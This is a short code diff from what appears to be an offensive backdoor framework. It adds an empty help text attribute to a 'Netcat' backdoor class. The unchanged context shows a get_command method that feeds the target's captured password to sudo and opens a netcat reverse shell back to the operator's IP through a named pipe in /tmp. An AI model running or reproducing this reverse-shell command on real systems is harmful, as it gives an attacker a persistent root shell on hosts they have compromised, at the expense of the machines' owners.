@@ -12,6 +12,7 @@ class Netcat(Backdoor):
                 }
         self.allow_modules = True
         self.modules = {} 
+        self.help_text = "" 
 	
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup cat /tmp/f | /bin/sh -i 2>&1 | nc " + self.core.localIP + " %s > /tmp/f" % self.get_value("port")
